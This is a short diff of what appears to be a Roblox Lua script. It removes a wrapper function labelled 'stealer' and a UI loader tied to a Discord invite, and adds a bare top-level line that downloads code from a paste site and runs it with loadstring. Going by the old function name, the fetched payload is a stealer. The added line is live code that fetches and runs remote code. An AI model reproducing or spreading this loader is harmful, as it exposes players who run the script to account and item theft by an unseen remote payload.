@@ -1,10 +1,2 @@
-local function stealer()
-   loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WW0Z4ghVUe/0", true))()
-end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WW0Z4ghVUe/0", true))()
 
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
